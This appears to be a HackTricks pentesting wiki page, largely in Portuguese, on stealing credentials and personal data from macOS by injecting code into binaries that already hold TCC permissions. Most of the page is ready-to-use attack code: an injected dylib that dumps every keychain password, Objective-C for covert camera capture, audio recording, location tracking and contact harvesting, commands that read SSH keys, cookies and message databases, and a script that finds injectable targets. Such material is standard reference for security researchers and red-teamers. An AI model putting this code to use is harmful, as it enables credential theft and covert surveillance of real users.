# macOS Roubo de Credenciais & Dados via Permissões TCC

{{#include ../../../banners/hacktricks-training.md}}

## Visão geral

macOS TCC (Transparency, Consent, and Control) protege o acesso a dados sensíveis do usuário. Quando um atacante **compromete um binário que já possui concessões TCC**, ele herda essas permissões. Esta página documenta o potencial de exploração de cada permissão TCC relacionada ao roubo de dados.

> [!WARNING]
> Injeção de código em um binário com concessões TCC (via DYLD injection, dylib hijacking, ou task port) **herda silenciosamente todas as suas permissões TCC**. Não há prompt ou verificação adicional quando o mesmo processo lê dados protegidos.

---

## Keychain Access Groups

### O prêmio

O Keychain do macOS armazena:
- **Wi-Fi passwords** — todas as credenciais de redes sem fio salvas
- **Website passwords** — Safari, Chrome (quando usa Keychain), e senhas de outros navegadores
- **Application passwords** — contas de e-mail, credenciais de VPN, tokens de desenvolvimento
- **Certificates and private keys** — assinatura de código, TLS de cliente, criptografia S/MIME
- **Secure notes** — segredos armazenados pelo usuário

### Entitlement: `keychain-access-groups`

Keychain items are organized into **access groups**. An application's `keychain-access-groups` entitlement lists which groups it can access:
```xml
<key>keychain-access-groups</key>
<array>
<string>com.apple.cfnetwork</string>   <!-- Network passwords -->
<string>com.apple.security.personal-information.identity</string>  <!-- Personal certs -->
<string>apple</string>                  <!-- Broad Apple group -->
<string>InternetAccounts</string>       <!-- Internet account passwords -->
</array>
```
### Exploração
```bash
# Find binaries with broad keychain access groups
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND isAppleBin = 0
ORDER BY privileged DESC;"

# If you can inject into such a binary, enumerate keychain items:
security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>&1 | head -100

# Find specific passwords
security find-generic-password -s "Wi-Fi" -w 2>&1
security find-internet-password -s "github.com" 2>&1
```
### Code Injection → Keychain Theft
```objc
// Injected dylib code — runs with the target's keychain groups
#import <Security/Security.h>

__attribute__((constructor))
void dumpKeychain(void) {
NSDictionary *query = @{
(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnAttributes: @YES,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll
};

CFArrayRef results = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, (CFTypeRef *)&results);

if (status == errSecSuccess) {
NSArray *items = (__bridge NSArray *)results;
for (NSDictionary *item in items) {
NSString *service = item[(__bridge id)kSecAttrService];
NSString *account = item[(__bridge id)kSecAttrAccount];
NSData *passData = item[(__bridge id)kSecValueData];
NSString *password = [[NSString alloc] initWithData:passData encoding:NSUTF8StringEncoding];
// service, account, password — the full credential triple
}
}
}
```
---

## Acesso à Câmera (kTCCServiceCamera)

### Exploração

Um binary com concessão TCC de câmera (via `kTCCServiceCamera` ou `com.apple.security.device.camera` entitlement) pode capturar fotos e vídeo:
```bash
# Find camera-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceCamera' AND auth_value=2;"
```
### Captura Silenciosa
```objc
// Injected into a camera-entitled process
#import <AVFoundation/AVFoundation.h>

@interface SilentCapture : NSObject <AVCaptureVideoDataOutputSampleBufferDelegate>
@property (strong) AVCaptureSession *session;
@end

@implementation SilentCapture
- (void)startCapture {
self.session = [[AVCaptureSession alloc] init];
AVCaptureDevice *camera = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:camera error:nil];
[self.session addInput:input];

AVCaptureVideoDataOutput *output = [[AVCaptureVideoDataOutput alloc] init];
[output setSampleBufferDelegate:self queue:dispatch_get_global_queue(0, 0)];
[self.session addOutput:output];

[self.session startRunning];
// Camera LED turns on — but a brief capture may go unnoticed
}

- (void)captureOutput:(AVCaptureOutput *)output
didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer
fromConnection:(AVCaptureConnection *)connection {
// Each frame can be saved to disk or exfiltrated
// Stop after capturing a few frames to minimize LED time
[self.session stopRunning];
}
@end
```
> [!TIP]
> A partir do **macOS Sonoma**, o indicador da câmera na barra de menus é persistente e não pode ser ocultado programaticamente. Em **versões anteriores do macOS**, uma captura breve pode não produzir um indicador perceptível.

---

## Acesso ao Microfone (kTCCServiceMicrophone)

### Exploração

O acesso ao microfone captura todo o áudio do microfone integrado, do fone de ouvido ou de dispositivos de entrada de áudio conectados:
```bash
# Find mic-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceMicrophone' AND auth_value=2;"
```
### Ataque: Ambient Recording
```objc
// Injected into a mic-entitled process
#import <AVFoundation/AVFoundation.h>

- (void)recordAudio {
NSURL *url = [NSURL fileURLWithPath:@"/tmp/recording.m4a"];
NSDictionary *settings = @{
AVFormatIDKey: @(kAudioFormatMPEG4AAC),
AVSampleRateKey: @44100.0,
AVNumberOfChannelsKey: @1
};
AVAudioRecorder *recorder = [[AVAudioRecorder alloc] initWithURL:url settings:settings error:nil];
[recorder record];
// Records everything: conversations, phone calls, ambient audio

// Stop after a duration
dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
dispatch_get_main_queue(), ^{
[recorder stop];
// Exfiltrate /tmp/recording.m4a
});
}
```
---

## Rastreamento de Localização (kTCCServiceLocation)

### Exploração
```bash
# Find location-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service LIKE '%Location%' AND auth_value=2;"
```
### Monitoramento Contínuo
```objc
#import <CoreLocation/CoreLocation.h>

@interface Tracker : NSObject <CLLocationManagerDelegate>
@end

@implementation Tracker
- (void)startTracking {
CLLocationManager *mgr = [[CLLocationManager alloc] init];
mgr.delegate = self;
mgr.desiredAccuracy = kCLLocationAccuracyBest;
[mgr startUpdatingLocation];
}

- (void)locationManager:(CLLocationManager *)manager
didUpdateLocations:(NSArray<CLLocation *> *)locations {
CLLocation *loc = locations.lastObject;
// loc.coordinate.latitude, loc.coordinate.longitude
// Reveals: home address, work address, travel patterns, daily routine
NSString *entry = [NSString stringWithFormat:@"%f,%f,%@\n",
loc.coordinate.latitude, loc.coordinate.longitude, [NSDate date]];
// Append to tracking log
}
@end
```
---

## Contatos / Calendário / Fotos

### Exfiltração de Dados Pessoais

| TCC Service | Framework | Data |
|---|---|---|
| `kTCCServiceAddressBook` | `Contacts.framework` | Nomes, emails, telefones, endereços |
| `kTCCServiceCalendar` | `EventKit` | Reuniões, participantes, locais |
| `kTCCServicePhotos` | `Photos.framework` | Fotos, capturas de tela, metadados de localização |
```bash
# Find authorized binaries for each service
for svc in kTCCServiceAddressBook kTCCServiceCalendar kTCCServicePhotos; do
echo "=== $svc ==="
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='$svc' AND auth_value=2;"
done
```
### Coleta de Contatos
```objc
#import <Contacts/Contacts.h>

CNContactStore *store = [[CNContactStore alloc] init];
NSArray *keys = @[CNContactGivenNameKey, CNContactFamilyNameKey,
CNContactEmailAddressesKey, CNContactPhoneNumbersKey];
CNContactFetchRequest *request = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];

[store enumerateContactsWithFetchRequest:request error:nil
usingBlock:^(CNContact *contact, BOOL *stop) {
// contact.givenName, contact.familyName
// contact.emailAddresses, contact.phoneNumbers
// All contacts exfiltrated for social engineering / spear phishing
}];
```
---

## Acesso à conta iCloud

### Permissão: `com.apple.private.icloud-account-access`

Esta permissão permite comunicar com o serviço XPC `com.apple.iCloudHelper`, fornecendo acesso a:
- **iCloud tokens** — tokens de autenticação para o Apple ID do usuário
- **iCloud Drive** — documentos sincronizados de todos os dispositivos
- **iCloud Keychain** — senhas sincronizadas em todos os dispositivos Apple
- **Find My** — localização de todos os dispositivos Apple do usuário
```bash
# Find iCloud-entitled binaries
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE iCloudAccs = 1
ORDER BY privileged DESC;"
```
> [!CAUTION]
> Comprometer um binário com entitlement iCloud estende o ataque de **um único dispositivo para todo o ecossistema Apple**: outros Macs, iPhones, iPads, Apple Watch. A sincronização do iCloud Keychain significa que as senhas de todos os dispositivos ficam acessíveis.
> 
> ---

## Acesso Total ao Disco (kTCCServiceSystemPolicyAllFiles)

### A permissão TCC mais poderosa

Acesso Total ao Disco concede capacidade de leitura para **cada arquivo do sistema**, incluindo:
- Dados de outros apps (Messages, Mail, histórico do Safari)
- Bancos de dados do TCC (revelando todas as outras permissões)
- Chaves SSH e configuração
- Cookies de navegador e tokens de sessão
- Bancos de dados de aplicações e caches
```bash
# Find FDA-granted binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND auth_value=2;"

# With FDA, read anything:
cat ~/Library/Messages/chat.db              # iMessage history
cat ~/Library/Safari/History.db             # Safari browsing history
cat ~/Library/Cookies/Cookies.binarycookies # Browser cookies
cat ~/.ssh/id_rsa                           # SSH private key
```
---

## Matriz de Prioridade de Exploração

Ao avaliar binários injetáveis com permissões TCC, priorize por valor dos dados:

| Prioridade | Permissão TCC | Por quê |
|---|---|---|
| **Crítico** | Acesso Total ao Disco | Acesso a tudo |
| **Crítico** | Gerenciador TCC | Pode conceder qualquer permissão |
| **Alto** | Grupos de Acesso ao Keychain | Todas as senhas armazenadas |
| **Alto** | Acesso à Conta iCloud | Comprometimento em múltiplos dispositivos |
| **Alto** | Monitoramento de Entrada (ListenEvent) | Keylogging |
| **Alto** | Acessibilidade | Controle da GUI, auto-concessão |
| **Médio** | Captura de Tela | Captura visual de dados |
| **Médio** | Câmera + Microfone | Vigilância |
| **Médio** | Contatos + Calendário | Dados para engenharia social |
| **Baixo** | Localização | Rastreamento físico |
| **Baixo** | Fotos | Dados pessoais |

## Script de Enumeração
```bash
#!/bin/bash
echo "=== TCC Credential Theft Surface Audit ==="

echo -e "\n[*] High-value TCC grants (injectable binaries):"
sqlite3 /tmp/executables.db "
SELECT path, tccPermsStr FROM executables
WHERE (noLibVal = 1 OR allowDyldEnv = 1)
AND tccPermsStr IS NOT NULL
AND tccPermsStr != ''
ORDER BY privileged DESC
LIMIT 30;" 2>/dev/null

echo -e "\n[*] Keychain-entitled injectable binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND (noLibVal = 1 OR allowDyldEnv = 1);" 2>/dev/null

echo -e "\n[*] iCloud-entitled binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE iCloudAccs = 1;" 2>/dev/null
```
## Referências

* [Apple Developer — Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
* [Apple Developer — TCC](https://developer.apple.com/documentation/security/protecting-the-user-s-privacy)
* [Objective-See — TCC Exploitation](https://objectivesee.org/blog/blog_0x4C.html)
* [OBTS v5.0 — iCloud Token Extraction (Wojciech Regula)](https://www.youtube.com/watch?v=_6e2LhmxVc0)

{{#include ../../../banners/hacktricks-training.md}}
